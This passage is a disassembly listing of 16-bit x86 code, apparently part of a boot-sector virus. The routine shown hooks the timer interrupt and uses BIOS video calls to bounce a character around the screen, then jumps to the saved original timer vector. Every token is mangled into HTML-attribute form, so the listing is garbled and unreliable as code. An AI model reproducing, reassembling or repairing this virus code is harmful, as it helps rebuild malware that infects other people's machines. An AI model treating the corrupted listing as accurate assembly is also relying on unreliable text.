cmp="" bx,l7fd4="" ;sum="" vars="" ;7eec="" 3b="" 1e="" d4="" 7f="" jz="" l7f27="" ;7ef0="" 74="" 35="" mov="" l7fd4,bx="" ;sum="" vars="" ;7ef2="" 89="" 1e="" d4="" 7f="" dec="" ah="" ;7ef6="" fe="" cc="" mov="" l7fd6,ah="" ;sum="" vars="" ;7ef8="" 88="" 26="" d6="" 7f="" mov="" ah,1="" ;7efc="" b4="" 01="" cmp="" bl,7="" ;7efe="" 80="" fb="" 07="" jnz="" l7f05="" ;7f01="" 75="" 02="" dec="" ah="" ;7f03="" fe="" cc="" ;l7f05="" l7f01="" cj="" l7f05:="" cmp="" bl,4="" ;7f05="" 80="" fb="" 04="" jnb="" l7f0c="" ;7f08="" 73="" 02="" dec="" ah="" ;7f0a="" fe="" cc="" ;l7f0c="" l7f08="" cj="" l7f0c:="" mov="" l7fd3,ah="" ;sum="" vars="" ;7f0c="" 88="" 26="" d3="" 7f="" mov="" word="" ptr="" l7fcf,101="" ;7f10="" c7="" 06="" cf="" 7f="" 01="" 01="" mov="" word="" ptr="" l7fd1,101="" ;7f16="" c7="" 06="" d1="" 7f="" 01="" 01="" mov="" ah,3="" ;7f1c="" b4="" 03="" int="" 10="" ;7f1e="" cd="" 10="" push="" dx="" ;7f20="" 52="" mov="" dx,l7fcf="" ;7f21="" 8b="" 16="" cf="" 7f="" jmp="" short="" l7f4a="" ;7f25="" eb="" 23="" ;l7f27="" l7ef0="" cj="" l7f27:="" mov="" ah,3="" ;7f27="" b4="" 03="" int="" 10="" ;7f29="" cd="" 10="" push="" dx="" ;7f2b="" 52="" mov="" ah,2="" ;7f2c="" b4="" 02="" mov="" dx,l7fcf="" ;7f2e="" 8b="" 16="" cf="" 7f="" int="" 10="" ;7f32="" cd="" 10="" mov="" ax,l7fcd="" ;sum="" vars="" ;7f34="" a1="" cd="" 7f="" cmp="" byte="" ptr="" l7fd3,1="" ;sum="" vars="" ;7f37="" 80="" 3e="" d3="" 7f="" 01="" jnz="" l7f41="" ;7f3c="" 75="" 03="" mov="" ax,offset="" l8307="" ;7f3e="" b8="" 07="" 83="" ;l7f41="" l7f3c="" cj="" l7f41:="" mov="" bl,ah="" ;7f41="" 8a="" dc="" mov="" cx,1="" ;7f43="" b9="" 01="" 00="" mov="" ah,9="" ;7f46="" b4="" 09="" int="" 10="" ;7f48="" cd="" 10="" ;l7f4a="" l7f25="" cj="" l7f4a:="" mov="" cx,l7fd1="" ;7f4a="" 8b="" 0e="" d1="" 7f="" cmp="" dh,0="" ;7f4e="" 80="" fe="" 00="" jnz="" l7f58="" ;7f51="" 75="" 05="" xor="" ch,0ff="" ;7f53="" 80="" f5="" ff="" inc="" ch="" ;7f56="" fe="" c5="" ;l7f58="" l7f51="" cj="" l7f58:="" cmp="" dh,18="" ;7f58="" 80="" fe="" 18="" jnz="" l7f62="" ;7f5b="" 75="" 05="" xor="" ch,0ff="" ;7f5d="" 80="" f5="" ff="" inc="" ch="" ;7f60="" fe="" c5="" ;l7f62="" l7f5b="" cj="" l7f62:="" cmp="" dl,0="" ;7f62="" 80="" fa="" 00="" jnz="" l7f6c="" ;7f65="" 75="" 05="" xor="" cl,0ff="" ;7f67="" 80="" f1="" ff="" inc="" cl="" ;7f6a="" fe="" c1="" ;l7f6c="" l7f65="" cj="" l7f6c:="" cmp="" dl,l7fd6="" ;sum="" vars="" ;7f6c="" 3a="" 16="" d6="" 7f="" jnz="" l7f77="" ;7f70="" 75="" 05="" xor="" cl,0ff="" ;7f72="" 80="" f1="" ff="" inc="" cl="" ;7f75="" fe="" c1="" ;l7f77="" l7f70="" cj="" l7f77:="" cmp="" cx,l7fd1="" ;7f77="" 3b="" 0e="" d1="" 7f="" jnz="" l7f94="" ;7f7b="" 75="" 17="" mov="" ax,l7fcd="" ;sum="" vars="" ;7f7d="" a1="" cd="" 7f="" and="" al,7="" ;7f80="" 24="" 07="" cmp="" al,3="" ;7f82="" 3c="" 03="" jnz="" l7f8b="" ;7f84="" 75="" 05="" xor="" ch,0ff="" ;7f86="" 80="" f5="" ff="" inc="" ch="" ;7f89="" fe="" c5="" ;l7f8b="" l7f84="" cj="" l7f8b:="" cmp="" al,5="" ;7f8b="" 3c="" 05="" jnz="" l7f94="" ;7f8d="" 75="" 05="" xor="" cl,0ff="" ;7f8f="" 80="" f1="" ff="" inc="" cl="" ;7f92="" fe="" c1="" ;l7f94="" l7f7b="" cj="" l7f8d="" cj="" l7f94:="" add="" dl,cl="" ;7f94="" 02="" d1="" add="" dh,ch="" ;7f96="" 02="" f5="" mov="" l7fd1,cx="" ;7f98="" 89="" 0e="" d1="" 7f="" mov="" l7fcf,dx="" ;7f9c="" 89="" 16="" cf="" 7f="" mov="" ah,2="" ;7fa0="" b4="" 02="" int="" 10="" ;7fa2="" cd="" 10="" mov="" ah,8="" ;7fa4="" b4="" 08="" int="" 10="" ;7fa6="" cd="" 10="" mov="" l7fcd,ax="" ;sum="" vars="" ;7fa8="" a3="" cd="" 7f="" mov="" bl,ah="" ;7fab="" 8a="" dc="" cmp="" byte="" ptr="" l7fd3,1="" ;sum="" vars="" ;7fad="" 80="" 3e="" d3="" 7f="" 01="" jnz="" l7fb6="" ;7fb2="" 75="" 02="" mov="" bl,83="" ;7fb4="" b3="" 83="" ;l7fb6="" l7fb2="" cj="" l7fb6:="" mov="" cx,1="" ;7fb6="" b9="" 01="" 00="" mov="" ax,907="" ;7fb9="" b8="" 07="" 09="" int="" 10="" ;7fbc="" cd="" 10="" pop="" dx="" ;7fbe="" 5a="" mov="" ah,2="" ;7fbf="" b4="" 02="" int="" 10="" ;7fc1="" cd="" 10="" pop="" dx="" ;7fc3="" 5a="" pop="" cx="" ;7fc4="" 59="" pop="" bx="" ;7fc5="" 5b="" pop="" ax="" ;7fc6="" 58="" pop="" ds="" ;7fc7="" 1f="" ;="" jmp="" far="" opcode="" db="" 0ea="" ;7fc8="" ea="" ;l7fc9="" l7ed7="" dw="" old_timer_off="" equ="" $="" dw="" timer_off="" ;7fc9="" 20="" 00="" ;l7fcb="" l7eda="" dw="" old_timer_seg="" equ="" $="" dw="" l0000="" ;7fcb="" 00="" 00="" ;l7fcd="" l7f34="" dr="" l7f7d="" dr="" l7fa8="" dw="" ;="" sum="" vars="" l7fcd="" dw="" l0000="" ;7fcd="" 00="" 00="" ;l7fcf="" l7f10="" dw="" l7f21="" dr="" l7f2e="" dr="" l7f9c="" dw="" l7fcf="" dw="" l0101="" ;7fcf="" 01="" 01="" ;l7fd1="" l7f16="" dw="" l7f4a="" dr="" l7f77="" dt="" l7f98="" dw="" l7fd1="" dw="" l0101="" ;7fd1="" 01="" 01="" ;l7fd3="" l7f0c="" dw="" l7f37="" dt="" l7fad="" dt="" ;="" sum="" vars="" l7fd3="" db="" 0="" ;7fd3="" 00="" ;l7fd4="" l7eec="" dt="" l7ef2="" dw="" ;="" sum="" vars="" l7fd4="" dw="" lffff="" ;7fd4="" ff="" ff="" ;l7fd6="" l7ef8="" dw="" l7f6c="" dt="" ;="" sum="" vars="" l7fd6="" db="" 50="" ;7fd6="" 50="" ;l8000="" l7cc7="" di="" l7e2d="" dr="" l7e68="" dm="" l8000="" equ="" $+29="" ;l8002="" l7d63="" di="" l8002="" equ="" $+2bh="" ;l800b="" l7d8b="" dt="" l800b="" equ="" $+34="" ;l800d="" l7d93="" dt="" l800d="" equ="" $+36="" ;l800e="" l7d9a="" dr="" l800e="" equ="" $+37="" ;l8010="" l7d9e="" dr="" l8010="" equ="" $+39="" ;l8011="" l7dab="" dr="" l8011="" equ="" $+3a="" ;l8016="" l7da2="" dr="" l8016="" equ="" $+3f="" ;l81be="" l7d40="" di="" l81be="" equ="" $+1e7="" ;l81f5="" l7d7d="" dr="" l81f5="" equ="" $+21e="" ;l81f9="" l7d83="" dr="" l81f9="" equ="" $+222="" ;l81fb="" l7d76="" dt="" l81fb="" equ="" $+224="" ;l81fc="" l7d6e="" dt="" l81fc="" equ="" $+225="" ;l8307="" l7f3e="" di="" l8307="" equ="" $+330="" ;lffc0="" l7c66="" di="" lffc0="" equ="" $+7fe9="" ;lfff7="" l7e51="" di="" lfff7="" equ="" $-7fe0="" ;lffff="" l7fd4="" ci="" lffff="" equ="" $-7fd8="" s0000="" ends="" ;="" end="" =""></->